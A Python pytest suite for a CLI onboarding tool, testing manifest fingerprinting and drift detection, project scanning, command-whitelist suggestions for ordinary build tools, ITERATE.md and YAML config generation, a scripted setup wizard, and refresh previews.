"""Tests for iterate_cli onboarding modules.

Covers fingerprint, scan, generator, wizard, refresh, and CLI with
normal paths, error paths, and boundary scenarios.
"""

from __future__ import annotations

import hashlib
import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

# Make iterate_cli and scripts importable.
REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))
sys.path.insert(0, str(REPO_ROOT / "scripts"))

from iterate_cli.cli import main as cli_main
from iterate_cli.fingerprint import (
    FINGERPRINT_VERSION,
    FingerprintEntry,
    capture_fingerprints,
    check_drift,
    compare_fingerprints,
    compute_sha256,
    fingerprints_from_dict,
    fingerprints_to_dict,
    scan_manifests,
)
from iterate_cli.generator import (
    AI_END_MARKER,
    AI_START_MARKER,
    DEFAULT_ATOMIC_MAX_ADJACENT_METHODS,
    DEFAULT_ATOMIC_MAX_LINES,
    DEFAULT_GOAL,
    DEFAULT_MAX_ROUNDS,
    USER_END_MARKER,
    USER_START_MARKER,
    OnboardingData,
    extract_user_owned_section,
    generate_config_yaml,
    generate_iterate_md,
    generate_refreshed_md,
    normalize_reasoning_effort,
    write_onboarding_outputs,
)
from iterate_cli.personalize import (
    EXTRA_SAFE_PREFIXES_ENV,
    DimensionFocusOverride,
    KnownIntentional,
    PersonalizationData,
    RiskArea,
    _operator_extra_prefixes,
    load_existing_personalization,
    load_personalization_from_config,
    load_personalization_from_iterate_md,
    merge_personalization_into_config,
    run_personalize_wizard,
    save_personalization,
    save_personalization_to_config,
    validate_extra_command,
)
from iterate_cli.refresh import (
    REONBOARD_CANCELLED,
    REONBOARD_COMPLETED,
    REONBOARD_FAILED,
    REONBOARD_NO_CHANGES,
    _build_refresh_data,
    check_onboarding_drift,
    full_reonboard,
    incremental_refresh,
    is_onboarding_complete,
    load_onboarding_config,
    preview_refresh,
)
from iterate_cli.scan import (
    ScanResult,
    scan_project,
    suggest_command_whitelist,
    suggest_dimensions,
    suggest_validation_commands,
)
from iterate_cli.wizard import (
    NO_CHANGES_NEEDED,
    _ask_yes_no,
    _load_existing_onboarding_data,
    _optionally_collect_advanced_config,
    _parse_dimension_selection,
    _read_drift_ignore,
    _read_language,
    _read_optional_int,
    _read_optional_text,
    _read_reasoning_effort,
    run_wizard,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def fake_project(tmp_path: Path) -> Path:
    """Create a minimal fake project with a Python manifest."""
    project = tmp_path / "myproject"
    project.mkdir()
    (project / "pyproject.toml").write_text(
        '[project]\nname = "myproject"\nversion = "0.1.0"\n',
        encoding="utf-8",
    )
    (project / "src").mkdir()
    (project / "tests").mkdir()
    return project


@pytest.fixture
def fake_multi_project(tmp_path: Path) -> Path:
    """Create a project with multiple manifests and frontend indicators."""
    project = tmp_path / "fullstack"
    project.mkdir()
    (project / "package.json").write_text(
        '{"name": "fullstack", "version": "1.0.0"}',
        encoding="utf-8",
    )
    (project / "tsconfig.json").write_text(
        '{"compilerOptions": {"target": "es2020"}}',
        encoding="utf-8",
    )
    (project / "src").mkdir()
    (project / "src" / "pages").mkdir()
    (project / "src" / "components").mkdir()
    (project / "tests").mkdir()
    (project / "specs").mkdir()
    (project / ".github").mkdir()
    (project / ".github" / "workflows").mkdir()
    (project / "README.md").write_text("# Fullstack Project", encoding="utf-8")
    return project


@pytest.fixture
def empty_project(tmp_path: Path) -> Path:
    """Create an empty project directory with no manifests."""
    project = tmp_path / "empty"
    project.mkdir()
    return project


def _build_onboarding_data(project_root: Path, scan: ScanResult | None = None) -> OnboardingData:
    """Helper: build minimal OnboardingData for generator tests."""
    if scan is None:
        scan = scan_project(project_root)
    from iterate_cli.dimension_sets import suggest_dimension_sets

    return OnboardingData(
        project_root=project_root,
        channel="cli",
        scan=scan,
        project_description="Test project",
        code_conventions="Use 4-space indentation",
        dimensions=suggest_dimensions(scan),
        dimension_sets=suggest_dimension_sets(scan),
        target_branch="main",
        review_scope="full",
        push_per_round=True,
        validation_commands=suggest_validation_commands(scan),
        command_whitelist=suggest_command_whitelist(scan),
        fingerprints=capture_fingerprints(project_root),
    )


# ---------------------------------------------------------------------------
# Fingerprint tests
# ---------------------------------------------------------------------------

class TestComputeSha256:
    def test_hash_is_correct(self, tmp_path: Path) -> None:
        path = tmp_path / "test.txt"
        content = b"hello world"
        path.write_bytes(content)
        expected = hashlib.sha256(content).hexdigest()
        assert compute_sha256(path) == expected

    def test_hash_is_hex_string(self, tmp_path: Path) -> None:
        path = tmp_path / "test.txt"
        path.write_bytes(b"data")
        result = compute_sha256(path)
        assert len(result) == 64
        assert all(c in "0123456789abcdef" for c in result)

    def test_raises_on_missing_file(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            compute_sha256(tmp_path / "nonexistent.txt")

    def test_different_content_different_hash(self, tmp_path: Path) -> None:
        f1 = tmp_path / "a.txt"
        f2 = tmp_path / "b.txt"
        f1.write_bytes(b"content_a")
        f2.write_bytes(b"content_b")
        assert compute_sha256(f1) != compute_sha256(f2)


class TestScanManifests:
    def test_finds_existing_manifests(self, fake_project: Path) -> None:
        result = scan_manifests(fake_project)
        names = [p.name for p in result]
        assert "pyproject.toml" in names

    def test_finds_multiple_manifests(self, fake_multi_project: Path) -> None:
        result = scan_manifests(fake_multi_project)
        names = [p.name for p in result]
        assert "package.json" in names
        assert "tsconfig.json" in names

    def test_empty_project_returns_empty(self, empty_project: Path) -> None:
        assert scan_manifests(empty_project) == []

    def test_sorted_by_name(self, fake_multi_project: Path) -> None:
        result = scan_manifests(fake_multi_project)
        names = [p.name for p in result]
        assert names == sorted(names)


class TestCaptureFingerprints:
    def test_captures_all_manifests(self, fake_project: Path) -> None:
        entries = capture_fingerprints(fake_project)
        assert len(entries) == 1
        assert entries[0].path == "pyproject.toml"
        assert len(entries[0].sha256) == 64

    def test_empty_project(self, empty_project: Path) -> None:
        assert capture_fingerprints(empty_project) == []


class TestFingerprintSerialization:
    def test_roundtrip(self) -> None:
        entries = [
            FingerprintEntry(path="package.json", sha256="a" * 64),
            FingerprintEntry(path="pyproject.toml", sha256="b" * 64),
        ]
        dicts = fingerprints_to_dict(entries)
        restored = fingerprints_from_dict(dicts)
        assert restored == entries

    def test_from_dict_skips_invalid_entries(self) -> None:
        """Malformed entries are skipped, not raised (aligned with harness)."""
        assert fingerprints_from_dict(["not a dict"]) == []  # type: ignore[list-item]
        assert fingerprints_from_dict([{"sha256": "a" * 64}]) == []
        assert fingerprints_from_dict([{"path": "package.json"}]) == []
        assert fingerprints_from_dict([42, {"path": "a", "sha256": "b"}]) == [
            FingerprintEntry(path="a", sha256="b")
        ]


class TestCompareFingerprints:
    def test_no_drift(self) -> None:
        stored = [{"path": "package.json", "sha256": "a" * 64}]
        current = [{"path": "package.json", "sha256": "a" * 64}]
        result = compare_fingerprints(stored, current)
        assert not result.has_drift
        assert "package.json" in result.unchanged

    def test_changed(self) -> None:
        stored = [{"path": "package.json", "sha256": "a" * 64}]
        current = [{"path": "package.json", "sha256": "b" * 64}]
        result = compare_fingerprints(stored, current)
        assert result.has_drift
        assert "package.json" in result.changed

    def test_added(self) -> None:
        stored = []
        current = [{"path": "package.json", "sha256": "a" * 64}]
        result = compare_fingerprints(stored, current)
        assert result.has_drift
        assert "package.json" in result.added

    def test_removed(self) -> None:
        stored = [{"path": "package.json", "sha256": "a" * 64}]
        current = []
        result = compare_fingerprints(stored, current)
        assert result.has_drift
        assert "package.json" in result.removed

    def test_summary_no_drift(self) -> None:
        result = compare_fingerprints([], [])
        assert result.summary() == "No drift detected."

    def test_summary_with_drift(self) -> None:
        stored = [{"path": "a", "sha256": "1" * 64}]
        current = [{"path": "b", "sha256": "2" * 64}]
        result = compare_fingerprints(stored, current)
        summary = result.summary()
        assert "added: b" in summary
        assert "removed: a" in summary


class TestCheckDrift:
    def test_drift_detected_on_change(self, fake_project: Path) -> None:
        entries = capture_fingerprints(fake_project)
        stored = fingerprints_to_dict(entries)
        # Modify the manifest.
        (fake_project / "pyproject.toml").write_text("changed", encoding="utf-8")
        result = check_drift(fake_project, stored)
        assert result.has_drift
        assert "pyproject.toml" in result.changed

    def test_no_drift_when_unchanged(self, fake_project: Path) -> None:
        entries = capture_fingerprints(fake_project)
        stored = fingerprints_to_dict(entries)
        result = check_drift(fake_project, stored)
        assert not result.has_drift


# ---------------------------------------------------------------------------
# Scan tests
# ---------------------------------------------------------------------------

class TestScanProject:
    def test_python_project(self, fake_project: Path) -> None:
        result = scan_project(fake_project)
        assert "pyproject.toml" in result.manifests
        assert "Python" in result.detected_languages
        assert "src" in result.top_level_dirs
        assert result.has_tests is True

    def test_fullstack_project(self, fake_multi_project: Path) -> None:
        result = scan_project(fake_multi_project)
        assert "JavaScript/TypeScript" in result.detected_languages
        assert result.has_frontend is True
        assert result.has_specs is True
        assert result.has_ci is True

    def test_empty_project(self, empty_project: Path) -> None:
        result = scan_project(empty_project)
        assert result.manifests == []
        assert result.detected_languages == []
        assert not result.has_specs
        assert not result.has_tests


class TestSuggestDimensions:
    def test_python_project_suggests_base_dims(self, fake_project: Path) -> None:
        scan = scan_project(fake_project)
        dims = suggest_dimensions(scan)
        assert "correctness" in dims
        assert "security" in dims
        assert "ui-ux" not in dims

    def test_frontend_project_suggests_ui_ux(self, fake_multi_project: Path) -> None:
        scan = scan_project(fake_multi_project)
        dims = suggest_dimensions(scan)
        assert "ui-ux" in dims
        assert "frontend-backend" in dims
        assert "spec-compliance" in dims

    def test_empty_project(self, empty_project: Path) -> None:
        scan = scan_project(empty_project)
        dims = suggest_dimensions(scan)
        assert "correctness" in dims
        assert "ui-ux" not in dims


class TestSuggestValidationCommands:
    def test_python_commands(self, fake_project: Path) -> None:
        scan = scan_project(fake_project)
        cmds = suggest_validation_commands(scan)
        assert "python" in cmds
        assert any("ruff" in c for c in cmds["python"])
        assert any("pytest" in c for c in cmds["python"])

    def test_empty_project(self, empty_project: Path) -> None:
        scan = scan_project(empty_project)
        assert suggest_validation_commands(scan) == {}


class TestSuggestCommandWhitelist:
    def test_python_whitelist(self, fake_project: Path) -> None:
        scan = scan_project(fake_project)
        wl = suggest_command_whitelist(scan)
        assert "ruff" in wl
        assert "pytest" in wl

    def test_no_duplicates(self, fake_multi_project: Path) -> None:
        scan = scan_project(fake_multi_project)
        wl = suggest_command_whitelist(scan)
        assert len(wl) == len(set(wl))

    def test_go_whitelist_covers_go_vet(self) -> None:
        """Regression: the Go whitelist must be 'go', not 'go test'.

        ``_command_is_whitelisted`` matches a whitelist entry only when a
        command equals it or starts with it followed by whitespace, so with a
        ``go test`` entry the suggested ``go vet ./...`` would fail doctor's
        whitelist-compliance check. The broad ``go`` prefix covers both.
        """
        scan = ScanResult(detected_languages=["Go"])
        wl = suggest_command_whitelist(scan)
        assert "go test" not in wl
        assert "go" in wl
        # The suggested commands must all be covered by the whitelist under
        # the same matching rule doctor uses.
        from iterate_cli.doctor import _command_is_whitelisted

        for cmd in suggest_validation_commands(scan)["go"]:
            assert _command_is_whitelisted(cmd, wl), f"{cmd!r} not whitelisted"

    @pytest.mark.parametrize(
        "language, module_name, whitelist_entry",
        [
            ("Dart/Flutter", "dart", "dart"),
            ("Elixir", "elixir", "mix"),
            ("Ruby", "ruby", "bundle"),
            ("Swift", "swift", "swift"),
            ("Rust", "rust", "cargo"),
            ("Go", "go", "go"),
        ],
    )
    def test_new_language_whitelist(
        self, language: str, module_name: str, whitelist_entry: str
    ) -> None:
        """Dart/Elixir/Ruby/Swift/Rust/Go suggestions must be whitelist-covered."""
        scan = ScanResult(detected_languages=[language])
        wl = suggest_command_whitelist(scan)
        cmds = suggest_validation_commands(scan)
        assert module_name in cmds
        assert whitelist_entry in wl
        from iterate_cli.doctor import _command_is_whitelisted

        for cmd in cmds[module_name]:
            assert _command_is_whitelisted(cmd, wl), f"{cmd!r} not whitelisted"
        # Whitelist entries must themselves be doctor-safe (no shell chars /
        # slashes that violate the allow entry regex).
        from iterate_cli.doctor import DoctorReport, _check_whitelist_compliance

        report = DoctorReport("x")
        _check_whitelist_compliance(report, wl, cmds)
        assert not report.has_warnings(), report.to_dict()

    def test_java_uses_maven_when_pom_present(self) -> None:
        """Java with pom.xml must suggest mvn commands; gradle otherwise (fix)."""
        from iterate_cli.scan import ScanResult

        for manifests, expected_tool in ((["pom.xml"], "mvn"), (["build.gradle"], "gradle")):
            scan = ScanResult(detected_languages=["Java/Kotlin"], manifests=manifests)
            cmds = suggest_validation_commands(scan)
            assert cmds["java"][0].startswith(expected_tool), cmds["java"]
            wl = suggest_command_whitelist(scan)
            # mvn / gradle must also be whitelisted so the suggested commands
            # pass doctor's compliance check.
            assert expected_tool in wl

    def test_top_level_dirs_oseerror_does_not_crash(self, monkeypatch) -> None:
        """A listing failure during directory scan must not abort the run."""
        from iterate_cli.scan import ScanResult, _scan_top_level_dirs

        def _boom(*_args, **_kwargs):
            raise OSError("permission denied")

        class _BrokenDir:
            def iterdir(self):
                return _boom()

        result = ScanResult()
        result.top_level_dirs = []
        # Must not raise despite iterdir() failing.
        _scan_top_level_dirs(_BrokenDir(), result)
        assert result.top_level_dirs == []

    def test_fingerprint_oseerror_does_not_crash(self, fake_project: Path, monkeypatch) -> None:
        """An unreadable manifest must be skipped, not crash the capture."""
        # Make every manifest unreadable by forcing compute_sha256 to raise.
        import iterate_cli.fingerprint as fp

        def _boom(*_args, **_kwargs):
            raise OSError("cannot open")

        monkeypatch.setattr(fp, "compute_sha256", _boom)
        entries = fp.capture_fingerprints(fake_project)
        # Nothing could be fingerprinted, and no exception escaped.
        assert entries == []


# ---------------------------------------------------------------------------
# Generator tests
# ---------------------------------------------------------------------------

class TestGenerateIterateMd:
    def test_template_path_exists(self) -> None:
        """TEMPLATE_PATH must resolve to a readable file.

        Regression test: pip-installed wheels must bundle the template
        via [tool.setuptools.package-data] so that TEMPLATE_PATH resolves
        inside the installed package (iterate_cli/data/), not to a
        non-existent site-packages/templates/ directory.
        """
        from iterate_cli.generator import TEMPLATE_PATH

        assert TEMPLATE_PATH.exists(), (
            f"TEMPLATE_PATH does not exist: {TEMPLATE_PATH}. "
            "Ensure templates are bundled in iterate_cli/data/ via "
            "pyproject.toml [tool.setuptools.package-data]."
        )
        # Must be readable and non-empty.
        content = TEMPLATE_PATH.read_text(encoding="utf-8")
        assert len(content) > 0

    def test_contains_partition_markers(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md = generate_iterate_md(data)
        assert AI_START_MARKER in md
        assert AI_END_MARKER in md
        assert USER_START_MARKER in md
        assert USER_END_MARKER in md

    def test_contains_meta_info(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md = generate_iterate_md(data)
        assert "{{COMPLETED_AT}}" not in md
        assert "cli" in md
        assert FINGERPRINT_VERSION in md

    def test_contains_tech_stack(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md = generate_iterate_md(data)
        assert "Python" in md

    def test_contains_dimensions(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md = generate_iterate_md(data)
        assert "correctness" in md

    def test_no_unreplaced_placeholders(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md = generate_iterate_md(data)
        assert "{{" not in md
        assert "}}" not in md


class TestGenerateConfigYaml:
    def test_valid_yaml(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        yaml_text = generate_config_yaml(data)
        config = yaml.safe_load(yaml_text)
        assert isinstance(config, dict)
        assert config["dimensions"] == data.dimensions

    def test_contains_onboarding_section(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        yaml_text = generate_config_yaml(data)
        config = yaml.safe_load(yaml_text)
        assert "onboarding" in config
        assert config["onboarding"]["channel"] == "cli"
        assert config["onboarding"]["version"] == FINGERPRINT_VERSION
        assert isinstance(config["onboarding"]["fingerprints"], list)
        assert len(config["onboarding"]["fingerprints"]) == 1

    def test_config_passes_schema(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        yaml_text = generate_config_yaml(data)
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(yaml_text, encoding="utf-8")

        schema_path = REPO_ROOT / "config" / "config.schema.json"
        import validate
        errors = validate.validate_config(config_path, schema_path)
        assert errors == [], f"Schema validation errors: {errors}"

    def test_reasoning_effort_default_is_null(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        yaml_text = generate_config_yaml(data)
        config = yaml.safe_load(yaml_text)
        assert config["reasoning_effort"] is None

    def test_reasoning_effort_emitted_when_set(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.reasoning_effort = "high"
        yaml_text = generate_config_yaml(data)
        config = yaml.safe_load(yaml_text)
        assert config["reasoning_effort"] == "high"


class TestNormalizeReasoningEffort:
    def test_accepts_valid_levels(self) -> None:
        for level in ("low", "medium", "high"):
            assert normalize_reasoning_effort(level) == level

    def test_rejects_invalid_value(self) -> None:
        assert normalize_reasoning_effort("turbo") is None

    def test_none_stays_none(self) -> None:
        assert normalize_reasoning_effort(None) is None


class TestWriteOutputs:
    def test_writes_both_files(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md_path, config_path = write_onboarding_outputs(data, fake_project)
        assert md_path.is_file()
        assert config_path.is_file()
        assert md_path.name == "ITERATE.md"
        assert config_path.name == "iterate.config.yaml"


class TestExtractUserOwnedSection:
    def test_extracts_content(self) -> None:
        md = f"""
# ITERATE.md
{AI_START_MARKER}
AI content
{AI_END_MARKER}
---
{USER_START_MARKER}
## My Conventions
- Use 4 spaces
{USER_END_MARKER}
"""
        result = extract_user_owned_section(md)
        assert "My Conventions" in result
        assert "Use 4 spaces" in result

    def test_returns_default_when_markers_missing(self) -> None:
        result = extract_user_owned_section("no markers here")
        assert "Custom Code Conventions" in result

    def test_returns_default_when_markers_inverted(self) -> None:
        md = f"{USER_END_MARKER}\n{USER_START_MARKER}"
        result = extract_user_owned_section(md)
        assert "Custom Code Conventions" in result


class TestGenerateRefreshedMd:
    def test_preserves_user_content(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        original_md = generate_iterate_md(data)

        # Modify user section in the generated file.
        user_marker_pos = original_md.find(USER_START_MARKER)
        user_end_pos = original_md.find(USER_END_MARKER)
        modified_md = (
            original_md[:user_marker_pos + len(USER_START_MARKER)]
            + "\n## My Custom Rules\n- Never use var\n"
            + original_md[user_end_pos:]
        )

        # Generate refreshed version.
        refreshed = generate_refreshed_md(data, modified_md)

        # User content should be preserved.
        assert "My Custom Rules" in refreshed
        assert "Never use var" in refreshed

    def test_replaces_ai_content(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        original_md = generate_iterate_md(data)

        # Change project description for refresh.
        data.project_description = "Updated description"
        refreshed = generate_refreshed_md(data, original_md)
        assert "Updated description" in refreshed


# ---------------------------------------------------------------------------
# Wizard tests
# ---------------------------------------------------------------------------

class TestParseDimensionSelection:
    def test_valid_selection(self) -> None:
        result = _parse_dimension_selection("1,2,6")
        assert result == ["correctness", "security", "tech-debt"]

    def test_single_number(self) -> None:
        result = _parse_dimension_selection("3")
        assert result == ["performance"]

    def test_empty_string(self) -> None:
        assert _parse_dimension_selection("") == []

    def test_out_of_range(self) -> None:
        assert _parse_dimension_selection("0") == []
        assert _parse_dimension_selection("99") == []

    def test_non_numeric(self) -> None:
        assert _parse_dimension_selection("abc") == []


class TestAskYesNo:
    def test_yes(self) -> None:
        assert _ask_yes_no("test?", lambda _: "y") is True
        assert _ask_yes_no("test?", lambda _: "yes") is True

    def test_no(self) -> None:
        assert _ask_yes_no("test?", lambda _: "n") is False
        assert _ask_yes_no("test?", lambda _: "no") is False

    def test_default_on_empty(self) -> None:
        assert _ask_yes_no("test?", lambda _: "", default=True) is True
        assert _ask_yes_no("test?", lambda _: "", default=False) is False

    def test_retries_on_invalid(self) -> None:
        responses = iter(["maybe", "y"])
        assert _ask_yes_no("test?", lambda _: next(responses)) is True


class TestRunWizard:
    def test_full_flow_python_project(self, fake_project: Path) -> None:
        """Simulate a user going through the full wizard."""
        responses = iter([
            "y",          # gate question: continue
            "y",          # tech stack correct
            "y",          # use suggested validation commands
            "",           # use suggested dimensions (press Enter)
            "",           # dimension sets: enable all suggested
            "",           # target branch: default main
            "",           # review scope: default full
            "y",          # push per round: yes
            "Test project",  # project description
            "",           # code conventions: empty line to finish
            "n",          # advanced config: no
            "y",          # confirm and generate
            "n",          # personalization offer: no
        ])
        data = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert data is not None
        assert data.channel == "cli"
        assert "Python" in data.scan.detected_languages
        assert "correctness" in data.dimensions
        assert data.target_branch == "main"
        assert len(data.fingerprints) == 1
        assert data.personalization is None

    def test_gate_question_abort(self, fake_project: Path) -> None:
        responses = iter(["n"])  # gate: no
        data = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert data is None

    def test_gate_defaults_to_continue_on_empty(self, fake_project: Path) -> None:
        """Pressing Enter on the gate question should continue onboarding.

        The user explicitly ran `iterate onboard`, so the gate defaults to
        "continue" (Y) rather than aborting on an empty Enter.
        """
        responses = iter([
            "",           # gate: continue (default)
            "y",          # tech stack correct
            "y",          # use suggested commands
            "",           # default dimensions
            "",           # dimension sets: enable all suggested
            "",           # default branch
            "",           # default scope
            "n",          # push: no
            "Desc",       # description
            "",           # conventions: empty
            "n",          # advanced config: no
            "y",          # confirm and generate
            "n",          # personalization offer: no
        ])
        data = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert data is not None

    def test_cancel_at_confirmation(self, fake_project: Path) -> None:
        responses = iter([
            "y",          # gate: continue
            "y",          # tech stack correct
            "y",          # use suggested commands
            "",           # default dimensions
            "",           # dimension sets: enable all suggested
            "",           # default branch
            "",           # default scope
            "y",          # push: yes
            "Desc",       # description
            "",           # conventions: empty
            "n",          # advanced config: no
            "n",          # confirm: no
        ])
        data = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert data is None

    def test_manual_command_entry(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # gate: continue
            "y",              # tech stack correct
            "n",              # don't use suggested commands
            "python",         # module name
            "ruff check .",   # command
            "",               # end python commands
            "",               # end modules
            "",               # default dimensions
            "",               # dimension sets: enable all suggested
            "",               # default branch
            "",               # default scope
            "y",              # push: yes
            "Desc",           # description
            "",               # conventions: empty
            "n",              # advanced config: no
            "y",              # confirm: yes
            "n",              # personalization offer: no
        ])
        data = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert data is not None
        assert "python" in data.validation_commands
        assert "ruff check ." in data.validation_commands["python"]

    def test_custom_dimension_selection(self, fake_project: Path) -> None:
        responses = iter([
            "y",          # gate: continue
            "y",          # tech stack correct
            "y",          # use suggested commands
            "1,2,3",      # select dimensions 1,2,3
            "",           # dimension sets: enable all suggested
            "",           # default branch
            "",           # default scope
            "y",          # push: yes
            "Desc",       # description
            "",           # conventions: empty
            "n",          # advanced config: no
            "y",          # confirm: yes
            "n",          # personalization offer: no
        ])
        data = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert data is not None
        assert data.dimensions == ["correctness", "security", "performance"]


# ---------------------------------------------------------------------------
# Refresh tests
# ---------------------------------------------------------------------------

class TestIsOnboardingComplete:
    def test_not_complete(self, empty_project: Path) -> None:
        assert is_onboarding_complete(empty_project) is False

    def test_complete(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        assert is_onboarding_complete(fake_project) is True


class TestCheckOnboardingDrift:
    def test_no_drift(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        drift = check_onboarding_drift(fake_project)
        assert drift is not None
        assert not drift.has_drift

    def test_drift_detected(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        (fake_project / "pyproject.toml").write_text("changed", encoding="utf-8")
        drift = check_onboarding_drift(fake_project)
        assert drift is not None
        assert drift.has_drift
        assert "pyproject.toml" in drift.changed

    def test_no_config_returns_none(self, empty_project: Path) -> None:
        assert check_onboarding_drift(empty_project) is None

    def test_drift_check_disabled(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        # Disable drift check in config.
        config_path = fake_project / "iterate.config.yaml"
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        config["onboarding"]["drift_check"] = False
        config_path.write_text(yaml.safe_dump(config), encoding="utf-8")
        assert check_onboarding_drift(fake_project) is None


class TestIncrementalRefresh:
    def test_refresh_preserves_user_sections(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Add user content to ITERATE.md.
        iterate_md = fake_project / "ITERATE.md"
        content = iterate_md.read_text(encoding="utf-8")
        user_start = content.find(USER_START_MARKER)
        user_end = content.find(USER_END_MARKER)
        modified = (
            content[:user_start + len(USER_START_MARKER)]
            + "\n## My Custom Rules\n- Never use var\n"
            + content[user_end:]
        )
        iterate_md.write_text(modified, encoding="utf-8")

        # Perform refresh.
        assert incremental_refresh(fake_project) is True

        # User content preserved.
        refreshed = iterate_md.read_text(encoding="utf-8")
        assert "My Custom Rules" in refreshed
        assert "Never use var" in refreshed

    def test_refresh_updates_fingerprints(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Change manifest and refresh.
        (fake_project / "pyproject.toml").write_text("new content", encoding="utf-8")
        incremental_refresh(fake_project)

        config = load_onboarding_config(fake_project)
        assert config is not None
        new_fp = config["onboarding"]["fingerprints"]
        assert len(new_fp) == 1
        expected_hash = hashlib.sha256(b"new content").hexdigest()
        assert new_fp[0]["sha256"] == expected_hash

    def test_refresh_fails_without_iterate_md(self, empty_project: Path) -> None:
        assert incremental_refresh(empty_project) is False

    def test_refresh_defaults_push_per_round_to_false(self, fake_project: Path) -> None:
        """Refresh must default push_per_round to False (Secure-by-default).

        Regression: ``_build_refresh_data`` previously defaulted to True when
        the existing config lacked ``git.push_per_round``, which contradicts
        OnboardingData and the documented default.
        """
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Remove git.push_per_round from the config to simulate a config
        # that predates the Secure-by-default change.
        config_path = fake_project / "iterate.config.yaml"
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        config["git"].pop("push_per_round", None)
        config_path.write_text(
            yaml.safe_dump(config, sort_keys=False, allow_unicode=True),
            encoding="utf-8",
        )

        scan = scan_project(fake_project)
        existing_config = load_onboarding_config(fake_project) or {}
        refreshed = _build_refresh_data(fake_project, scan, existing_config)
        assert refreshed.push_per_round is False

    def test_refresh_preserves_reasoning_effort(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.reasoning_effort = "low"
        write_onboarding_outputs(data, fake_project)
        assert incremental_refresh(fake_project) is True
        config = load_onboarding_config(fake_project) or {}
        assert config.get("reasoning_effort") == "low"

    def test_refresh_normalizes_invalid_reasoning_effort(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        config_path = fake_project / "iterate.config.yaml"
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        config["reasoning_effort"] = "turbo"
        config_path.write_text(
            yaml.safe_dump(config, sort_keys=False, allow_unicode=True),
            encoding="utf-8",
        )

        scan = scan_project(fake_project)
        existing_config = load_onboarding_config(fake_project) or {}
        refreshed = _build_refresh_data(fake_project, scan, existing_config)
        assert refreshed.reasoning_effort is None


class TestRefreshDryRun:
    """Tests for ``preview_refresh`` and the ``iterate refresh --dry-run`` CLI."""

    def test_preview_up_to_date_returns_no_changes(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        preview = preview_refresh(fake_project)
        assert preview["ok"] is True
        assert preview["changed"] is False
        assert preview["config_changed"] is False
        assert preview["md_changed_lines"] == 0

    def test_preview_detects_stale_md(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        # Corrupt the AI-maintained section (keeping the USER-OWNED markers
        # intact) so a refresh would change ITERATE.md.
        iterate_md = fake_project / "ITERATE.md"
        original = iterate_md.read_text(encoding="utf-8")
        start = original.find(AI_START_MARKER)
        end = original.find(AI_END_MARKER)
        assert start != -1 and end > start
        corrupted = (
            original[: start + len(AI_START_MARKER)]
            + "\nstale AI-maintained content\n"
            + original[end:]
        )
        iterate_md.write_text(corrupted, encoding="utf-8")
        preview = preview_refresh(fake_project)
        assert preview["ok"] is True
        assert preview["changed"] is True
        assert preview["md_changed_lines"] > 0

    def test_preview_refuses_missing_user_markers(self, fake_project: Path) -> None:
        """A hand-edited ITERATE.md without USER-OWNED markers cannot be
        refreshed safely: preview must surface the refusal instead of showing
        a misleading diff of a refresh that would be blocked."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        iterate_md = fake_project / "ITERATE.md"
        iterate_md.write_bytes(b"this is not the generated content")
        preview = preview_refresh(fake_project)
        assert preview["ok"] is False
        assert "USER-OWNED" in preview["error"]

    def test_preview_detects_stale_config(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        # Write a config that lacks fingerprints so refresh would update it.
        config_path = fake_project / "iterate.config.yaml"
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        config["onboarding"].pop("fingerprints", None)
        config_path.write_text(
            yaml.safe_dump(config, sort_keys=False, allow_unicode=True),
            encoding="utf-8",
        )
        preview = preview_refresh(fake_project)
        assert preview["ok"] is True
        assert preview["changed"] is True
        assert preview["config_changed"] is True

